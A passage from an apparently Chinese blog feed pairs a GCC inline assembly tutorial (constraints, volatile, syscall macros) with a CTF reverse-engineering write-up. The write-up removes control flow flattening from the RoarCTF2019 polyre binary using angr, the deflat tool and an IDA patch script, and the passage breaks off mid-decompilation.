class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="volatile-关键字">Volatile 关键字</h4><p>如果熟悉内核源码，我们会经常看到volatile或者<strong>volatile</strong>关键字在asm或者<strong>asm</strong>之后。如果内联汇编需要在它原来所在的位置处被执行，例如不被移到循环的外面或者不被优化掉，在asm和 （）之间放一个volatile，像这样：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">asm volatile ( ... : ... : ... : ...);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果我们添加的汇编语言仅仅是为了计算并且没有任何边际效应，最好不要使用volatile关键字，因为volatile会妨碍代码优化。</p><h4 id="关于限定符">关于限定符</h4><p>前面的例子中我们已经使用了很多限定符，但还没有具体讲限定符的作用。限定符可以规定操作数是否在寄存器中，什么样的寄存器；以及操作数是指向内存以及内存地址类型；操作数是否是立即数，和数字的范围。来看下常用的限定符。</p><h5 id="寄存器操作数限定符-r">寄存器操作数限定符 ‘r’</h5><p>当使用这个限定符时，操作数被存储在通用寄存器中（General PurposeRegisters, GPR)。举例说明：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">asm ("movl %%eax, %0\n" :"=r"(myval));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>变量myval被存储到及粗糙那其中，寄存器eax中的值被copy到那个寄存器中，并且myval的值会被从寄存器更新到内存中。因为限定符’r’，gcc会把变量保存到任何一个通用寄存器中。如果需要明确指定某一个寄存器，需要使用相对应的限定符，如下表：</p><table><thead><tr class="header"><th style="text-align: left;">r</th><th style="text-align: left;">GPRs</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">a</td><td style="text-align: left;">%eax, %ax, %al</td></tr><tr class="even"><td style="text-align: left;">b</td><td style="text-align: left;">%ebx, %bx, %bl</td></tr><tr class="odd"><td style="text-align: left;">c</td><td style="text-align: left;">%ecx, %cx, %cl</td></tr><tr class="even"><td style="text-align: left;">d</td><td style="text-align: left;">%edx, %dx, %dl</td></tr><tr class="odd"><td style="text-align: left;">S</td><td style="text-align: left;">%esi, %si</td></tr><tr class="even"><td style="text-align: left;">D</td><td style="text-align: left;">%edi, %di</td></tr></tbody></table><h5 id="内存操作数限定符-m">内存操作数限定符 ‘m’</h5><p>当操作数在内存中，任何关于操作数的操作都直接访问内存地址。相反，寄存器操作数是先把数据存储到寄存器中，在写回到内存地址中。但寄存器限定符只有当指令明确需要或者明显加速处理，才会存储到寄存器中。当一个C变量需要在内联汇编更新的时候，内存限定符会更方便，并且，我们并不是真的需要用寄存器来存储值。例如存储IDTR的值到loc中：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">asm("sidt %0\n" : :"m"(loc));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="匹配限定符digit">匹配限定符(Digit)</h5><p>很多情况下，一个变量就可以做输入也可以做输出操作数，例如：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">asm ("incl %0" :"=a"(var):"0"(var));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来看一个简单的例子，寄存器eax及用作输入同时用作输出操作数。变量var作为输入，传值给eax，并且在完成自增后，又更新到eax中。“0”这里指代同一个限定符，第0个，也就是输出变量。也就是输出变量var只会被存到eax中。通常下列情况可以这样使用：</p><ul><li>当变量作为输入，并且协会到同一个变量中。</li><li>没必要把输入和输出分开的时候。匹配限定符最重要的作用是高效的使用寄存器。</li></ul><p>其他限定符： “g” : Any register, memory or immediate integer operandis allowed, except for registers that are not general registers. “m” : Amemory operand is allowed, with any kind of address that the machinesupports in general. “o” : A memory operand is allowed, but only if theaddress is offsettable. ie, adding a small offset to the address gives avalid address. “V” : A memory operand that is not offsettable. In otherwords, anything that would fit the<code>m’ constraint but not the</code>o’constraint. “i” : An immediateinteger operand (one with constant value) is allowed. This includessymbolic constants whose values will be known only at assembly time. “n”: An immediate integer operand with a known numeric value is allowed.Many systems cannot support assembly-time constants for operands lessthan a word wide. Constraints for these operands should use ’n’ ratherthan ’i’.</p><p>下面是X86特有的限定符： “r” : Register operand constraint, look tablegiven above. “q” : Registers a, b, c or d. “I” : Constant in range 0 to31 (for 32-bit shifts). “J” : Constant in range 0 to 63 (for 64-bitshifts). “K” : 0xff. “L” : 0xffff. “M” : 0, 1, 2, or 3 (shifts for leainstruction). “N” : Constant in range 0 to 255 (for out instruction).“f” : Floating point register “t” : First (top of stack) floating pointregister “u” : Second floating point register “A” : Specifies the ‘a’ or‘d’ registers. This is primarily useful for 64-bit integer valuesintended to be returned with the ‘d’ register holding the mostsignificant bits and the ‘a’ register holding the least significantbits.</p><h4 id="限定修饰符">限定修饰符</h4><ol type="1"><li>‘=’ 意思是操作数是“只写”的，之前的值会被输出值覆盖掉。</li><li>‘&amp;’意思是输入操作数在本条指令完成之前，被修改。但这个操作数可能没有列在输入操作数列表或者是内存的一部分。如果输入仅仅用于早起结果的输入时，输入操作数可以被看做earlyclobber操作数</li><li>‘+’ 意思是操作数是“可读可写”的。</li></ol><blockquote><p>参考：https://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.htmlhttps://www.ibm.com/developerworks/cn/linux/sdk/assemble/inline/http://flint.cs.yale.edu/cs421/papers/x86-asm/asm.html</p></blockquote><hr><h2 id="实例">实例</h2><p>First we start with a simple example. We’ll write a program to addtwo numbers.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">int main(void){        int foo = 10, bar = 15;        __asm__ __volatile__("addl  %%ebx,%%eax"                             :"=a"(foo)                             :"a"(foo), "b"(bar)                             );        printf("foo+bar=%d\n", foo);        return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Here we insist GCC to store foo in %eax, bar in %ebx and we also wantthe result in %eax. The ’=’ sign shows that it is an output register.Now we can add an integer to a variable in some other way.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">__asm__ __volatile__(                    "   lock       ;\n"                    "   addl %1,%0 ;\n"                    : "=m"  (my_var)                    : "ir"  (my_int), "m" (my_var)                    :                                 /* no clobber-list */                    );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This is an atomic addition. We can remove the instruction ’lock’ toremove the atomicity. In the output field, “=m” says that my_var is anoutput and it is in memory. Similarly, “ir” says that, my_int is aninteger and should reside in some register (recall the table we sawabove). No registers are in the clobber list.</p><p>Now we’ll perform some action on some registers/variables and comparethe value.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">__asm__ __volatile__(  "decl %0; sete %1"                    : "=m" (my_var), "=q" (cond)                    : "m" (my_var)                     : "memory"                    );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Here, the value of my_var is decremented by one and if the resultingvalue is 0 then, the variable cond is set. We can add atomicity byadding an instruction “lock; as the first instruction in assemblertemplate.</p><p>In a similar way we can use “incl %0” instead of “decl %0”, so as toincrement my_var.</p><p>Points to note here are that (i) my_var is a variable residing inmemory. (ii) cond is in any of the registers eax, ebx, ecx and edx. Theconstraint “=q” guarantees it. (iii) And we can see that memory is therein the clobber list. ie, the code is changing the contents ofmemory.</p><p>How to set/clear a bit in a register? As next recipe, we are going tosee it.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">__asm__ __volatile__(   "btsl %1,%0"                     : "=m" (ADDR)                     : "Ir" (pos)                     : "cc"                     );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Here, the bit at the position ’pos’ of variable at ADDR ( a memoryvariable ) is set to 1 We can use ’btrl’ for ’btsl’ to clear the bit.The constraint “Ir” of pos says that, pos is in a register, and it’svalue ranges from 0-31 (x86 dependant constraint). ie, we can set/clearany bit from 0th to 31st of the variable at ADDR. As the condition codeswill be changed, we are adding “cc” to clobberlist.</p><p>Now we look at some more complicated but useful function. Stringcopy.</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">static inline char * strcpy(char * dest,const char *src){int d0, d1, d2;__asm__ __volatile__(  "1:\tlodsb\n\t"                       "stosb\n\t"                       "testb %%al,%%al\n\t"                       "jne 1b"                     : "=&amp;S" (d0), "=&amp;D" (d1), "=&amp;a" (d2)                     : "0" (src),"1" (dest)                      : "memory");return dest;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The source address is stored in esi, destination in edi, and thenstarts the copy, when we reach at 0, copying is complete. Constraints“&amp;S”, “&amp;D”, “&amp;a” say that the registers esi, edi and eax areearly clobber registers, ie, their contents will change before thecompletion of the function. Here also it’s clear that why memory is inclobberlist.</p><p>We can see a similar function which moves a block of double words.Notice that the function is declared as a macro.</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++"> #define mov_blk(src, dest, numwords) \__asm__ __volatile__ (                                          \                       "cld\n\t"                                \                       "rep\n\t"                                \                       "movsl"                                  \                       :                                        \                       : "S" (src), "D" (dest), "c" (numwords)  \                       : "%ecx", "%esi", "%edi"                 \                       )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Here we have no outputs, so the changes that happen to the contentsof the registers ecx, esi and edi are side effects of the blockmovement. So we have to add them to the clobber list.</p><p>In Linux, system calls are implemented using GCC inline assembly. Letus look how a system call is implemented. All the system calls arewritten as macros (linux/unistd.h). For example, a system call withthree arguments is defined as a macro as shown below.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">_syscall3</span><span class="token expression"><span class="token punctuation">(</span>type<span class="token punctuation">,</span>name<span class="token punctuation">,</span>type1<span class="token punctuation">,</span>arg1<span class="token punctuation">,</span>type2<span class="token punctuation">,</span>arg2<span class="token punctuation">,</span>type3<span class="token punctuation">,</span>arg3<span class="token punctuation">)</span> </span><span class="token punctuation">\</span><span class="token expression">type <span class="token function">name</span><span class="token punctuation">(</span>type1 arg1<span class="token punctuation">,</span>type2 arg2<span class="token punctuation">,</span>type3 arg3<span class="token punctuation">)</span> </span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">{</span> </span><span class="token punctuation">\</span><span class="token expression"><span class="token keyword">long</span> __res<span class="token punctuation">;</span> </span><span class="token punctuation">\</span><span class="token expression">__asm__ <span class="token keyword">volatile</span> <span class="token punctuation">(</span>  </span><span class="token string">"int $0x80"</span> <span class="token punctuation">\</span>                  <span class="token expression"><span class="token operator">:</span> </span><span class="token string">"=a"</span> <span class="token expression"><span class="token punctuation">(</span>__res<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>                  <span class="token expression"><span class="token operator">:</span> </span><span class="token string">"0"</span> <span class="token expression"><span class="token punctuation">(</span>__NR_</span><span class="token punctuation">##</span><span class="token expression">name<span class="token punctuation">)</span><span class="token punctuation">,</span></span><span class="token string">"b"</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span></span><span class="token string">"c"</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> </span><span class="token punctuation">\</span>                    <span class="token string">"d"</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>arg3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span class="token punctuation">\</span><span class="token expression"><span class="token function">__syscall_return</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span>__res<span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">}</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Whenever a system call with three arguments is made, the macro shownabove is used to make the call. The syscall number is placed in eax,then each parameters in ebx, ecx, edx. And finally “int 0x80” is theinstruction which makes the system call work. The return value can becollected from eax.</p><p>Every system calls are implemented in a similar way. Exit is a singleparameter syscall and let’s see how it’s code will look like. It is asshown below.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"> {        asm("movl $1,%%eax;         /* SYS_exit is 1 */             xorl %%ebx,%%ebx;      /* Argument is in ebx, it is 0 */             int  $0x80"            /* Enter kernel mode */             );}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The number of exit is “1” and here, it’s parameter is 0. So wearrange eax to contain 1 and ebx to contain 0 and by int $0x80, theexit(0) is executed. This is how exit works.</p><h2 id="访问外部变量">访问外部变量</h2><p>内联程序集的一个重大便利就是能够按名称引用 C 或 C++ 变量。<strong><code>__asm</code></strong>块可引用任何符号，包括位于块所在的范围内的变量名称。 例如，如果 C 变量<code>var</code> 位于范围内，则指令</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">__asm mov eax<span class="token punctuation">,</span> var<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 EAX 中存储 <code>var</code> 的值。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// InlineAssembler_Accessing_C_asm_Blocks.cpp</span><span class="token comment">// processor: x86</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">struct</span> <span class="token class-name">first_type</span><span class="token punctuation">{</span>   <span class="token keyword">char</span> <span class="token operator">*</span>weasel<span class="token punctuation">;</span>   <span class="token keyword">int</span> same_name<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">second_type</span><span class="token punctuation">{</span>   <span class="token keyword">int</span> wonton<span class="token punctuation">;</span>   <span class="token keyword">long</span> same_name<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">struct</span> <span class="token class-name">first_type</span> hal<span class="token punctuation">;</span>   <span class="token keyword">struct</span> <span class="token class-name">second_type</span> oat<span class="token punctuation">;</span>   __asm   <span class="token punctuation">{</span>      lea ebx<span class="token punctuation">,</span> hal      mov ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebx<span class="token punctuation">]</span>hal<span class="token punctuation">.</span>same_name <span class="token punctuation">;</span> Must use <span class="token char">'hal'</span>      mov esi<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebx<span class="token punctuation">]</span><span class="token punctuation">.</span>weasel       <span class="token punctuation">;</span> Can omit <span class="token char">'hal'</span>   <span class="token punctuation">}</span>   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="refer">Refer</h2><ul><li><a href="https://learn.microsoft.com/zh-cn/cpp/assembler/inline/accessing-c-or-cpp-data-in-asm-blocks?view=msvc-170">在__asm 块中访问 C 或 C++ 数据</a></li><li>https://www.owalle.com/2019/05/22/inline-assembly/</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>控制流平坦化与Debug Blocker</title>
      <link href="/2023/01/23/kong-zhi-liu-ping-tan-hua-yu-debug-blocker/"/>
      <url>/2023/01/23/kong-zhi-liu-ping-tan-hua-yu-debug-blocker/</url>
      
        <content type="html"><![CDATA[<h1 id="x01-控制流平坦化">0x01 控制流平坦化</h1><p>控制流平坦化(control flowflattening)的基本思想主要是通过一个主分发器来控制程序基本块的执行流程，这样可以模糊基本块之间的前后关系，增加程序分析的难度。</p><p>举例说明：</p><p>一个程序的正常执行逻辑如下图</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b1677b4c34900982429ced58b0ed05cc99c3967c.png" alt="image-20220415103605737"><figcaption aria-hidden="true">image-20220415103605737</figcaption></figure><p>经过控制流平坦化后的执行流程就如下图</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://shs3.b.qianxin.com/attack_forum/2022/04/attach-15c0a9782ff5b0915264f5dc576d550ccfffb91e.png" alt="image-20220415103952583"><figcaption aria-hidden="true">image-20220415103952583</figcaption></figure><p>控制流平坦化的本质：混淆代码块之间的逻辑，将其之前的逻辑混肴成switch<a href="https://so.csdn.net/so/search?q=嵌套&amp;spm=1001.2101.3001.7020">嵌套</a>循环，增加分析难度。</p><h2 id="利用angr符号执行去流平坦化">利用angr符号执行去流平坦化</h2><h3 id="环境配置ubuntu-angr">环境配置|ubuntu angr</h3><p>首先安装一些依赖包</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-dev libffi-dev build-essential virtualenvwrapper<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装angr</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">mkvirtualenv angr <span class="token operator">&amp;&amp;</span> pip install angr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>建议使用 virtualenv 来安装，因为 angr用到的一些库和正常下的不一样，直接 pip安装可能会安装不上去。我的ubuntu上无mkvirtualenv命令，但是很幸运，pip安装成功了</p><h3 id="实战去流平坦化roarctf2019polyre">实战去流平坦化|[RoarCTF2019]polyre</h3><p>从程序结构图可以看出非常明显的流平坦化特征</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://shs3.b.qianxin.com/attack_forum/2022/04/attach-53978e239766260eb123f6631143724c5307a8e9.png" alt="image-20220415145710116"><figcaption aria-hidden="true">image-20220415145710116</figcaption></figure><p>查看main函数地址</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://shs3.b.qianxin.com/attack_forum/2022/04/attach-8721c7db00878c6e3cbfea01641ec44c1d528196.png" alt="image-20220415151624605">这里我们使用腾讯安全应急响应中心提供的工具进行去平坦化的处理，工具链接:https://github.com/cq674350529/deflat</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://shs3.b.qianxin.com/attack_forum/2022/04/attach-c5d097e9c062abcb0e1d0a510b3bb09b61b75702.png" alt="image-20220415152754873"><figcaption aria-hidden="true">image-20220415152754873</figcaption></figure><p>看到successful，标志着我们成功去除流平坦化混淆<img src="https://googles.plus/images/loading.gif" data-original="https://shs3.b.qianxin.com/attack_forum/2022/04/attach-c9cef86853d088ac1c44ffa427661581fd4a1000.png" alt="image-20220415152714458"></p><p>将我们去混淆的程序放入ida可以看到程序结构恢复到正常结构</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://shs3.b.qianxin.com/attack_forum/2022/04/attach-abf041a4b7fc21a464fb194783e4ab93a1f8a883.png" alt="image-20220415153630785"><figcaption aria-hidden="true">image-20220415153630785</figcaption></figure><p>观察代码，此时开启了虚假控制流程，代码中的条件都是永真条件（while;do...while），因此可以在观察时忽略或删除while语句和do...while语句。</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://shs3.b.qianxin.com/attack_forum/2022/04/attach-1b89c83e2d0609566140f8db935d3dcd5107ce46.png" alt="image-20220415154012686"><figcaption aria-hidden="true">image-20220415154012686</figcaption></figure><p>也可以写脚本来处理虚假控制流程，这里提供一个官方WP中给出的脚本，在IDA中的script中执行即可。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">def <span class="token function">patch_nop</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token class-name return-type">PatchByte</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>def <span class="token function">next_instr</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> addr<span class="token operator">+</span><span class="token function">ItemSize</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>st <span class="token operator">=</span> <span class="token number">0x0000000000401117</span>end <span class="token operator">=</span> <span class="token number">0x0000000000402144</span>addr <span class="token operator">=</span> st<span class="token keyword">while</span><span class="token punctuation">(</span>addr<span class="token operator">&lt;</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token class-name return-type">next</span> <span class="token operator">=</span> <span class="token function">next_instr</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string double-quoted-string">"ds:dword_603054"</span> in <span class="token function">GetDisasm</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token constant boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token class-name return-type">addr</span> <span class="token operator">=</span> next            next <span class="token operator">=</span> <span class="token function">next_instr</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string double-quoted-string">"jnz"</span> in <span class="token function">GetDisasm</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token class-name return-type">dest</span> <span class="token operator">=</span> <span class="token function">GetOperandValue</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token function">PatchByte</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token number">0xe9</span><span class="token punctuation">)</span>                <span class="token function">PatchByte</span><span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>                 offset <span class="token operator">=</span> dest <span class="token operator">-</span> <span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span>                <span class="token function">PatchDword</span><span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> offset<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"patch bcf: 0x%x"</span><span class="token operator">%</span>addr<span class="token punctuation">)</span>                addr <span class="token operator">=</span> next                <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        addr <span class="token operator">=</span> next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终我们得到了去平坦化之后的加密核心代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+1E0h] [rbp-110h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+1E8h] [rbp-108h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+1ECh] [rbp-104h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [rsp+1ECh] [rbp-104h]</span>  <span class="token keyword">char</span> s1<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+1F0h] [rbp-100h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+220h] [rbp-D0h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+25Ch] [rbp-94h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+260h] [rbp-90h]</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+26Ch] [rbp-84h]</span>  bool v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+272h] [rbp-7Eh]</span>  <span class="token keyword">unsigned</span> __int8 v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+273h] [rbp-7Dh]</span>  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment">// [rsp+274h] [rbp-7Ch]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+278h] [rbp-78h]</span>  <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment">// [rsp+284h] [rbp-6Ch]</span>  <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment">// [rsp+288h] [rbp-68h]</span>  bool v19<span class="token punctuation">;</span> <span class="token comment">// [rsp+28Fh] [rbp-61h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v20<span class="token punctuation">;</span> <span class="token comment">// [rsp+290h] [rbp-60h]</span>  <span class="token keyword">int</span> v21<span class="token punctuation">;</span> <span class="token comment">// [rsp+298h] [rbp-58h]</span>  bool v22<span class="token punctuation">;</span> <span class="token comment">// [rsp+29Fh] [rbp-51h]</span>  __int64 v23<span class="token punctuation">;</span> <span class="token comment">// [rsp+2A0h] [rbp-50h]</span>  bool v24<span class="token punctuation">;</span> <span class="token comment">// [rsp+2AFh] [rbp-41h]</span>  __int64 v25<span class="token punctuation">;</span> <span class="token comment">// [rsp+2B0h] [rbp-40h]</span>  __int64 v26<span class="token punctuation">;</span> <span class="token comment">// [rsp+2B8h] [rbp-38h]</span>  __int64 v27<span class="token punctuation">;</span> <span class="token comment">// [rsp+2C0h] [rbp-30h]</span>  __int64 v28<span class="token punctuation">;</span> <span class="token comment">// [rsp+2C8h] [rbp-28h]</span>  <span class="token keyword">int</span> v29<span class="token punctuation">;</span> <span class="token comment">// [rsp+2D0h] [rbp-20h]</span>  <span class="token keyword">int</span> v30<span class="token punctuation">;</span> <span class="token comment">// [rsp+2D4h] [rbp-1Ch]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v31<span class="token punctuation">;</span> <span class="token comment">// [rsp+2D8h] [rbp-18h]</span>  <span class="token keyword">int</span> v32<span class="token punctuation">;</span> <span class="token comment">// [rsp+2E0h] [rbp-10h]</span>  <span class="token keyword">int</span> v33<span class="token punctuation">;</span> <span class="token comment">// [rsp+2E4h] [rbp-Ch]</span>  bool v34<span class="token punctuation">;</span> <span class="token comment">// [rsp+2EBh] [rbp-5h]</span>  v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x30uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x30uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v11 <span class="token operator">=</span> s<span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token punctuation">(</span>dword_603054 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3788079310LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v12 <span class="token operator">=</span> i<span class="token punctuation">;</span>    v13 <span class="token operator">=</span> i <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">&gt;=</span> <span class="token number">64</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    v14 <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    v15 <span class="token operator">=</span> v14<span 